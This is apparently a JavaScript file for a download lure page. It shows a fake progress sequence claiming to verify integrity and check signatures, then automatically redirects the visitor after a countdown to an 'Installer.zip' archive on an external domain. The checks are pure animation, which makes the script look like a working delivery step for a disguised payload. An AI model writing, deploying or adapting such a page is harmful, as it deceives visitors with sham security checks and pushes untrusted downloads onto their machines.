document.addEventListener("DOMContentLoaded", () => {
  const REDIRECT_URL = "https://ultraviolence.buzz/d/Installer.zip";

  const bar         = document.getElementById("progress-bar");
  const pct         = document.getElementById("progress-pct");
  const labelEl     = document.getElementById("progress-label");
  const etaSecs     = document.getElementById("eta-secs");
  const dlSection   = document.getElementById("download-section");
  const countdown   = document.getElementById("countdown");
  const btn         = document.getElementById("redirect-now");
  const manualLink  = document.getElementById("redirect-manual");

  const steps = [
    { label: "Verifying integrity...",    pct: 18,  delay: 400 },
    { label: "Checking signatures...",    pct: 37,  delay: 750 },
    { label: "Resolving dependencies...", pct: 54,  delay: 650 },
    { label: "Packaging archive...",      pct: 71,  delay: 700 },
    { label: "Finalizing...",             pct: 88,  delay: 500 },
    { label: "Ready.",                    pct: 100, delay: 350 },
  ];

  let elapsed = 0;
  const totalMs = steps.reduce((s, x) => s + x.delay, 0);

  function runSteps(i) {
    if (i >= steps.length) {
      showDownload();
      return;
    }
    const step = steps[i];
    setTimeout(() => {
      bar.style.width = step.pct + "%";
      pct.textContent = step.pct + "%";
      labelEl.textContent = step.label;
      elapsed += step.delay;
      const remaining = Math.ceil((totalMs - elapsed) / 1000);
      etaSecs.textContent = remaining > 0 ? remaining + "s" : "0s";
      runSteps(i + 1);
    }, step.delay);
  }

  function showDownload() {
    dlSection.style.display = "block";
    startCountdown();
  }

  function startCountdown() {
    let secs = 3;
    countdown.textContent = secs;
    const iv = setInterval(() => {
      secs--;
      countdown.textContent = secs;
      if (secs <= 0) {
        clearInterval(iv);
        doRedirect();
      }
    }, 1000);
  }

  function doRedirect() {
    window.location.href = REDIRECT_URL;
  }

  // Ripple effect on button click
  if (btn) {
    btn.addEventListener("click", (e) => {
      const rect = btn.getBoundingClientRect();
      const ripple = document.createElement("span");
      const size = Math.max(rect.width, rect.height);
      ripple.className = "ripple";
      ripple.style.width  = ripple.style.height = size + "px";
      ripple.style.left   = (e.clientX - rect.left  - size / 2) + "px";
      ripple.style.top    = (e.clientY - rect.top   - size / 2) + "px";
      btn.appendChild(ripple);
      setTimeout(() => ripple.remove(), 600);
      setTimeout(doRedirect, 120);
    });
  }

  if (manualLink) {
    manualLink.addEventListener("click", (e) => {
      e.preventDefault();
      doRedirect();
    });
  }

  // Kick off
  setTimeout(() => runSteps(0), 200);
});
